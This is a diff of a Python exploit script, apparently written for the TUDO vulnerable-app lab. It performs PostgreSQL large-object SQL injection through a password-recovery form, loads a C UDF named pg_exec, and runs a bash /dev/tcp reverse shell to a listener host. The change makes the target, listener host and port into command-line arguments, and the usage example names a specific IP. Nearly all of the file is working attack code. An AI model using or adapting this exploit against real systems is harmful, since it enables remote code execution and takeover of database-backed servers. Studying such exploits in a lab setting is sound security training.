@@ -5,15 +5,18 @@
 # @date   22.10.2022
 
 import random
+import sys
+
 import requests
 
 
-def reverse_shell_via_large_object(base_url: str, listener_host: str, port=4242):
+def reverse_shell_via_large_object(base_url: str, listener_host: str, listener_port: str):
     """Gain a reverse shell via postgresql large object injection
 
     Keyword arguments:
     base_url -- base URL of the TUDO application
-    listener_host -- listening host on where to send the reverse shell to. Port defaults to 4242
+    listener_host -- listening host on where to send the reverse shell to.
+    listener_port -- netcat listening TCP port.
     """
 
     loid = random.randint(10, 100000)  # Generate a new loid everytime so the exploit is reusable in subsequent runs
@@ -47,11 +50,22 @@ def reverse_shell_via_large_object(base_url: str, listener_host: str, port=4242)
 
     # UDF Extension is now exported to the file system, load it and open up a reverse shell
     payload += "CREATE FUNCTION sys(cstring) RETURNS int AS '{}', 'pg_exec' LANGUAGE C STRICT;".format(extension_name)
-    payload += 'SELECT sys(\'bash -c "bash -i >& /dev/tcp/{}/{} 0>&1"\');'.format(listener_host, port)
+    payload += 'SELECT sys(\'bash -c "bash -i >& /dev/tcp/{}/{} 0>&1"\');'.format(listener_host, listener_port)
     payload += "DROP FUNCTION IF EXISTS sys(cstring) -- -"
 
     requests.post("{}/forgotusername.php".format(base_url), data={"username": payload})
 
 
+# Example usage:
+# python3 lo_injection_rce.py http://localhost:4444 172.105.246.127 4242
+
 if __name__ == '__main__':
-    reverse_shell_via_large_object(base_url="http://localhost:4444", listener_host="172.105.246.127")
+    if len(sys.argv) != 4:
+        print("usage: %s TARGET LHOST LPORT" % sys.argv[0])
+        sys.exit(-1)
+
+    target = sys.argv[1]
+    lhost = sys.argv[2]
+    lport = sys.argv[3]
+
+    reverse_shell_via_large_object(base_url=target, listener_host=lhost, listener_port=lport)
